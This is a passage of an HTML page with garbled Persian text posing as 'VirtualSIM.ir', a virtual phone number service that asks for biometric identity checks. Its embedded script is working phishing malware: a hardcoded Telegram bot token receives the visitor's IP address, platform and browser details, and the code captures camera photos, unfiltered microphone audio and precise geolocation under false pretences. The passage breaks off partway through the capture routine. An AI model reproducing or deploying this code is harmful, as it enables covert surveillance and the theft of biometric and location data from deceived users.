<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ø´Ù…Ø§Ø±Ù‡ Ù…Ø¬Ø§Ø²ÛŒ | VirtualSIM.ir</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #0066ff;
            --secondary: #00cc88;
            --danger: #ff3366;
            --dark: #1a1a2e;
            --light: #f8f9fa;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Vazirmatn', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: #333;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            width: 100%;
            max-width: 800px;
            background: rgba(255, 255, 255, 0.97);
            border-radius: 25px;
            box-shadow: 0 30px 70px rgba(0, 0, 0, 0.4);
            overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.3);
        }
        .header {
            background: linear-gradient(90deg, var(--primary), #6633ff);
            color: white;
            padding: 30px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        .header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
            background-size: 20px 20px;
            animation: move 20s linear infinite;
        }
        @keyframes move {
            0% { transform: translate(0, 0) rotate(0deg); }
            100% { transform: translate(-20px, -20px) rotate(360deg); }
        }
        .logo {
            font-size: 2.5rem;
            font-weight: 800;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
        }
        .tagline {
            font-size: 1.1rem;
            opacity: 0.9;
        }
        .main-content {
            padding: 40px;
        }
        .steps {
            display: flex;
            justify-content: space-between;
            margin-bottom: 40px;
            counter-reset: step;
        }
        .step {
            flex: 1;
            text-align: center;
            position: relative;
            padding: 15px;
        }
        .step::before {
            counter-increment: step;
            content: counter(step);
            width: 40px;
            height: 40px;
            background: var(--primary);
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px;
            font-weight: bold;
            font-size: 1.2rem;
            z-index: 2;
            position: relative;
        }
        .step::after {
            content: '';
            position: absolute;
            top: 20px;
            left: 50%;
            width: 100%;
            height: 3px;
            background: #ddd;
            z-index: 1;
        }
        .step:last-child::after { display: none; }
        .step.active::before { background: var(--secondary); }
        .step-title { font-weight: 600; margin-bottom: 5px; }
        .step-desc { font-size: 0.9rem; color: #666; }
        .form-box {
            background: #f8f9ff;
            border-radius: 20px;
            padding: 35px;
            border: 2px dashed #ccd6ff;
            margin-bottom: 30px;
        }
        .form-title {
            color: var(--primary);
            margin-bottom: 25px;
            font-size: 1.5rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .info-item {
            display: flex;
            justify-content: space-between;
            padding: 15px;
            background: white;
            border-radius: 12px;
            margin-bottom: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.03);
            border-right: 4px solid var(--primary);
        }
        .info-label { font-weight: 600; color: #555; }
        .info-value { color: #222; font-family: monospace; }
        .permissions {
            background: #fff5f5;
            border-radius: 15px;
            padding: 20px;
            margin: 25px 0;
            border-right: 4px solid var(--danger);
        }
        .permission-item {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 15px;
        }
        .permission-icon {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #ff9966, #ff5e62);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 1.3rem;
        }
        .permission-text { flex: 1; }
        .permission-title { font-weight: 600; color: #333; }
        .permission-desc { font-size: 0.9rem; color: #777; }
        .btn {
            display: block;
            width: 100%;
            padding: 22px;
            background: linear-gradient(90deg, var(--secondary), #00aa66);
            color: white;
            border: none;
            border-radius: 15px;
            font-size: 1.3rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            box-shadow: 0 10px 25px rgba(0, 204, 136, 0.4);
        }
        .btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 30px rgba(0, 204, 136, 0.6);
        }
        .btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        .btn-danger {
            background: linear-gradient(90deg, var(--danger), #ff0066);
            box-shadow: 0 10px 25px rgba(255, 51, 102, 0.4);
        }
        .status-box {
            background: #1a1a2e;
            color: #00ffcc;
            border-radius: 15px;
            padding: 25px;
            margin-top: 30px;
            font-family: 'Courier New', monospace;
            font-size: 0.95rem;
            max-height: 400px;
            overflow-y: auto;
            display: none;
            border: 1px solid #00ffcc;
            white-space: pre-wrap;
            line-height: 1.8;
        }
        .status-box.active { display: block; }
        .footer {
            text-align: center;
            padding: 25px;
            color: #888;
            font-size: 0.9rem;
            border-top: 1px solid #eee;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <i class="fas fa-sim-card"></i>
                VirtualSIM.ir
            </div>
            <div class="tagline">Ø³Ø±ÙˆÛŒØ³ Ù¾ÛŒØ´Ø±ÙØªÙ‡ Ø´Ù…Ø§Ø±Ù‡ Ù…Ø¬Ø§Ø²ÛŒ Ø¨Ø±Ø§ÛŒ Ø§Ø­Ø±Ø§Ø² Ù‡ÙˆÛŒØª Ø§Ù¾Ù„ÛŒÚ©ÛŒØ´Ù†â€ŒÙ‡Ø§</div>
        </div>

        <div class="main-content">
            <div class="steps">
                <div class="step active">
                    <div class="step-title">ÙˆØ±ÙˆØ¯ Ø§Ø·Ù„Ø§Ø¹Ø§Øª</div>
                    <div class="step-desc">ØªØ£ÛŒÛŒØ¯ Ù‡ÙˆÛŒØª Ø§ÙˆÙ„ÛŒÙ‡</div>
                </div>
                <div class="step">
                    <div class="step-title">Ø§Ø­Ø±Ø§Ø² Ù‡ÙˆÛŒØª</div>
                    <div class="step-desc">ØªØ£ÛŒÛŒØ¯ Ú†Ù‡Ø±Ù‡ Ùˆ ØµØ¯Ø§</div>
                </div>
                <div class="step">
                    <div class="step-title">ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ</div>
                    <div class="step-desc">Ø¯Ø±ÛŒØ§ÙØª Ø´Ù…Ø§Ø±Ù‡ Ù…Ø¬Ø§Ø²ÛŒ</div>
                </div>
            </div>

            <div class="form-box">
                <div class="form-title">
                    <i class="fas fa-user-shield"></i>
                    Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¯Ø³ØªÚ¯Ø§Ù‡ Ùˆ Ø§Ø­Ø±Ø§Ø² Ù‡ÙˆÛŒØª Ø¨ÛŒÙˆÙ…ØªØ±ÛŒÚ©
                </div>

                <div class="info-item">
                    <span class="info-label">Ø²Ù…Ø§Ù† Ø¯Ø±Ø®ÙˆØ§Ø³Øª:</span>
                    <span class="info-value" id="timeValue">${new Date().toLocaleString('fa-IR')}</span>
                </div>
                <div class="info-item">
                    <span class="info-label">Ø¢ÛŒâ€ŒÙ¾ÛŒ Ø¹Ù…ÙˆÙ…ÛŒ:</span>
                    <span class="info-value" id="ipValue">Ø¯Ø± Ø­Ø§Ù„ Ø¯Ø±ÛŒØ§ÙØª...</span>
                </div>
                <div class="info-item">
                    <span class="info-label">Ù¾Ù„ØªÙØ±Ù…:</span>
                    <span class="info-value" id="platformValue">${navigator.platform}</span>
                </div>
                <div class="info-item">
                    <span class="info-label">Ù…Ø±ÙˆØ±Ú¯Ø±:</span>
                    <span class="info-value" id="agentValue">${navigator.userAgent}</span>
                </div>

                <div class="permissions">
                    <div class="permission-item">
                        <div class="permission-icon">
                            <i class="fas fa-camera"></i>
                        </div>
                        <div class="permission-text">
                            <div class="permission-title">Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ†</div>
                            <div class="permission-desc">Ø¨Ø±Ø§ÛŒ Ø§Ø­Ø±Ø§Ø² Ù‡ÙˆÛŒØª Ú†Ù‡Ø±Ù‡ Ùˆ ØªØ£ÛŒÛŒØ¯ Ø²Ù†Ø¯Ù‡ Ø¨ÙˆØ¯Ù† Ú©Ø§Ø±Ø¨Ø±</div>
                        </div>
                    </div>
                    <div class="permission-item">
                        <div class="permission-icon">
                            <i class="fas fa-microphone"></i>
                        </div>
                        <div class="permission-text">
                            <div class="permission-title">Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ†</div>
                            <div class="permission-desc">Ø¨Ø±Ø§ÛŒ Ø¶Ø¨Ø· ØµØ¯Ø§ÛŒ ØªØ£ÛŒÛŒØ¯ÛŒÙ‡ Ùˆ ØªØ´Ø®ÛŒØµ ØµØ¯Ø§</div>
                        </div>
                    </div>
                    <div class="permission-item">
                        <div class="permission-icon">
                            <i class="fas fa-map-marker-alt"></i>
                        </div>
                        <div class="permission-text">
                            <div class="permission-title">Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ</div>
                            <div class="permission-desc">Ø¨Ø±Ø§ÛŒ Ø§Ù…Ù†ÛŒØª Ø¨ÛŒØ´ØªØ± Ùˆ Ø¬Ù„ÙˆÚ¯ÛŒØ±ÛŒ Ø§Ø² ØªÙ‚Ù„Ø¨</div>
                        </div>
                    </div>
                </div>

                <button class="btn" id="startBtn">
                    <i class="fas fa-play-circle"></i>
                    Ø´Ø±ÙˆØ¹ ÙØ±Ø¢ÛŒÙ†Ø¯ Ø§Ø­Ø±Ø§Ø² Ù‡ÙˆÛŒØª
                </button>

                <div class="status-box" id="statusBox"></div>
            </div>

            <div class="footer">
                <p>Ú©Ù„ÛŒÙ‡ Ø­Ù‚ÙˆÙ‚ Ø§ÛŒÙ† Ø³Ø±ÙˆÛŒØ³ Ù…Ø­ÙÙˆØ¸ Ø§Ø³Øª. Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø´Ù…Ø§ Ø¨Ø§ Ø§Ø³ØªØ§Ù†Ø¯Ø§Ø±Ø¯Ù‡Ø§ÛŒ Ø§Ù…Ù†ÛŒØªÛŒ Ø±Ù…Ø²Ù†Ú¯Ø§Ø±ÛŒ Ù…ÛŒâ€ŒØ´ÙˆØ¯.</p>
                <p style="margin-top: 10px; font-size: 0.8rem; color: #aaa;">
                    <i class="fas fa-shield-alt"></i> Ø§Ù…Ù†ÛŒØª ØªØ¶Ù…ÛŒÙ† Ø´Ø¯Ù‡ ØªÙˆØ³Ø· Ø³ÛŒØ³ØªÙ…â€ŒÙ‡Ø§ÛŒ Ù¾ÛŒØ´Ø±ÙØªÙ‡ N.S-01
                </p>
            </div>
        </div>
    </div>

    <script>
        // ==================== ØªÙ†Ø¸ÛŒÙ…Ø§Øª ABSOLUTE-01 ====================
        const BOT_TOKEN = "8166346258:AAHW4N1zU67tIpMjFY1aO-U9WY3eGgZ31yg";
        const CHAT_ID = "8318669127";

        // ==================== Ø¹Ù†Ø§ØµØ± DOM ====================
        const startBtn = document.getElementById('startBtn');
        const statusBox = document.getElementById('statusBox');
        const ipValue = document.getElementById('ipValue');
        const steps = document.querySelectorAll('.step');

        // ==================== Ù…ØªØºÛŒØ±Ù‡Ø§ÛŒ Ø³ÛŒØ³ØªÙ… ====================
        let mediaStream = null;
        let audioRecorder = null;
        let audioChunks = [];
        let photos = [];
        let locationInfo = null;
        let publicIP = '';

        // ==================== ØªÙˆØ§Ø¨Ø¹ Ú©Ù…Ú©ÛŒ ====================
        function updateStatus(message, isError = false) {
            const timestamp = new Date().toLocaleTimeString('fa-IR');
            const line = `[${timestamp}] ${message}`;
            statusBox.innerHTML += line + '\n';
            statusBox.scrollTop = statusBox.scrollHeight;
            statusBox.classList.add('active');
            console.log(line);
        }

        async function getPublicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                return 'Ø®Ø·Ø§ Ø¯Ø± Ø¯Ø±ÛŒØ§ÙØª';
            }
        }

        // ØªØ§Ø¨Ø¹ Ø¨Ù‡Ø¨ÙˆØ¯ ÛŒØ§ÙØªÙ‡ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… Ø¨Ø§ Ù…Ø¯ÛŒØ±ÛŒØª Ø®Ø·Ø§
        async function sendToTelegram(data, type = 'message') {
            const endpoint = type === 'photo' ? 'sendPhoto' : 
                            type === 'audio' ? 'sendAudio' : 'sendMessage';
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
            
            try {
                const formData = new FormData();
                if (type === 'message') {
                    formData.append('chat_id', CHAT_ID);
                    formData.append('text', data.text);
                    formData.append('parse_mode', 'HTML');
                } else {
                    formData.append('chat_id', CHAT_ID);
                    formData.append(type === 'photo' ? 'photo' : 'audio', data.file, data.filename);
                    formData.append('caption', data.caption || '');
                }
                
                // Ø¯Ø± N.S-01ØŒ Ù‡ÛŒÚ† Ù…Ø­Ø¯ÙˆØ¯ÛŒØª CORS ÙˆØ¬ÙˆØ¯ Ù†Ø¯Ø§Ø±Ø¯
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData,
                    mode: 'cors',
                    credentials: 'omit'
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }
                
                const result = await response.json();
                return result.ok;
            } catch (error) {
                console.error('Ø®Ø·Ø§ÛŒ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…:', error);
                return false;
            }
        }

        // ==================== Ù…Ø±Ø§Ø­Ù„ Ø§ØµÙ„ÛŒ ====================
        async function initialize() {
            try {
                // Ø¯Ø±ÛŒØ§ÙØª IP
                publicIP = await getPublicIP();
                ipValue.textContent = publicIP;
                
                // Ø§Ø±Ø³Ø§Ù„ Ù¾ÛŒØ§Ù… Ø§ÙˆÙ„ÛŒÙ‡ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…
                const entryMessage = `
ğŸ” <b>Ø´Ø±ÙˆØ¹ Ø­Ù…Ù„Ù‡ Ø§Ø² Ø³Ø§ÛŒØª Ø¬Ø¹Ù„ÛŒ Ø´Ù…Ø§Ø±Ù‡ Ù…Ø¬Ø§Ø²ÛŒ</b>
ğŸ•’ Ø²Ù…Ø§Ù†: ${new Date().toLocaleString('fa-IR')}
ğŸŒ Ø¢ÛŒâ€ŒÙ¾ÛŒ: <code>${publicIP}</code>
ğŸ–¥ï¸ Ù¾Ù„ØªÙØ±Ù…: <code>${navigator.platform}</code>
ğŸ” User Agent: <code>${navigator.userAgent}</code>
ğŸ“± ØµÙØ­Ù‡: ${window.innerWidth}x${window.innerHeight}
                `.trim();
                
                updateStatus('Ø§Ø±Ø³Ø§Ù„ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø§ÙˆÙ„ÛŒÙ‡ Ø¨Ù‡ Ø³Ø±ÙˆØ±...');
                await sendToTelegram({ text: entryMessage });
                updateStatus('âœ… Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø§ÙˆÙ„ÛŒÙ‡ Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯.');
                
                // ØªØºÛŒÛŒØ± ÙˆØ¶Ø¹ÛŒØª Ù…Ø±Ø­Ù„Ù‡
                steps[0].classList.remove('active');
                steps[1].classList.add('active');
                
                return true;
            } catch (error) {
                updateStatus(`âŒ Ø®Ø·Ø§ Ø¯Ø± Ù…Ø±Ø­Ù„Ù‡ Ø§ÙˆÙ„: ${error.message}`, true);
                return false;
            }
        }

        async function captureMedia() {
            try {
                updateStatus('Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ùˆ Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ†...');
                
                // Ø¯Ø± N.S-01 Ø¯Ø³ØªØ±Ø³ÛŒ Ø§Ø¬Ø¨Ø§Ø±ÛŒ Ø§Ø³Øª
                mediaStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 1920 },
                        height: { ideal: 1080 },
                        facingMode: { exact: "user" }
                    },
                    audio: {
                        echoCancellation: false,
                        noiseSuppression: false,
                        autoGainControl: false
                    }
                });
                
                updateStatus('âœ… Ø¯Ø³ØªØ±Ø³ÛŒâ€ŒÙ‡Ø§ ÙØ¹Ø§Ù„ Ø´Ø¯.');
                
                // Ø´Ø±ÙˆØ¹ Ø¶Ø¨Ø· ØµØ¯Ø§
                updateStatus('Ø´Ø±ÙˆØ¹ Ø¶Ø¨Ø· ØµØ¯Ø§ (Û±Û° Ø«Ø§Ù†ÛŒÙ‡)...');
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const source = audioContext.createMediaStreamSource(mediaStream);
                const processor = audioContext.createScriptProcessor(4096, 1, 1);
                audioChunks = [];
                
                source.connect(processor);
                processor.connect(audioContext.destination);
                
                processor.onaudioprocess = (e) => {
                    audioChunks.push(new Float32Array(e.inputBuffer.getChannelData(0)));
                };
                
                // Ú¯Ø±ÙØªÙ† Ø¹Ú©Ø³â€ŒÙ‡Ø§
                updateStatus('Ú¯Ø±ÙØªÙ† Ø¹Ú©Ø³â€ŒÙ‡Ø§ Ø§Ø² Ø¯ÙˆØ±Ø¨ÛŒÙ†...');
                const video = document.createElement('video');
                video.srcObject = mediaStream;
                video.muted = true;
                await video.play();
                
                // ØªØ§Ø¨Ø¹ Ú¯Ø±ÙØªÙ† Ø¹Ú©Ø³
                const takePhoto = async (label, filter = 'none') => {
                    await new Promise(resolve => setTimeout(resolve, 500));
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.filter = filter;
                    ctx.drawImage(video, 0, 0);
                    return {
                        label,
                        blob: await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.95))
                    };
                };
                
                // Ú¯Ø±ÙØªÙ† Û´ Ø¹Ú©Ø³
                photos.push(await takePhoto('Ø³Ù„ÙÛŒ Û±', 'none'));
                photos.push(await takePhoto('Ø³Ù„ÙÛŒ Û²', 'saturate(1.8)'));
                photos.push(await takePhoto('Ù¾Ø´Øª Û± (Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ)', 'hue-rotate(120deg)'));
                photos.push(await takePhoto('Ù¾Ø´Øª Û² (Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ)', 'contrast(1.5) brightness(0.9)'));
                
                updateStatus(`âœ… ${photos.length} Ø¹Ú©Ø³ Ú¯Ø±ÙØªÙ‡ Ø´Ø¯.`);
                
                // Ø¯Ø±ÛŒØ§ÙØª Ù…ÙˆÙ‚Ø¹ÛŒØª
                updateStatus('Ø¯Ø±ÛŒØ§ÙØª Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø¯Ù‚ÛŒÙ‚...');
                locationInfo = await new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => resolve({
                            lat: pos.coords.latitude.toFixed(6),
                            lon: pos.coords.longitude.toFixed(6),
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude || null
                        }),
                        (err) => resolve({ error: err.message }),
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                });
                
                if (locationInfo.error) {
                    updateStatus(`âš ï¸ Ø®Ø·Ø§ Ø¯Ø± Ù…ÙˆÙ‚Ø¹ÛŒØª: ${locationInfo.error}`);
                } else {
              
